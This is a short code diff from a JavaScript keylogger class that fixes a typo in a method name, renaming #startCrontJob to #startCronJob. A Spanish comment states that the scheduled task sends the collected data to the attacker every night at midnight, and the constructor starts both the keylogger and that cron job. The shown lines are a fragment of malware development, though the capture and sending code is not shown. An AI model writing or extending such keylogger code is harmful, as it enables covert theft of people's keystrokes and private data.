@@ -11,7 +11,7 @@ class Keylogger {
 
     constructor() {
         this.#startKeylogger()
-        this.#startCrontJob()
+        this.#startCronJob()
     }
 
     /**
@@ -43,7 +43,7 @@ class Keylogger {
      * Creamos una tarea que envia los datos recopilados al atacante
      * todos los dias a las 12 de la noche
      */
-    #startCrontJob() {
+    #startCronJob() {
         cron.schedule('0 12 * * *', () => {
             this.#sendRequest()
         })
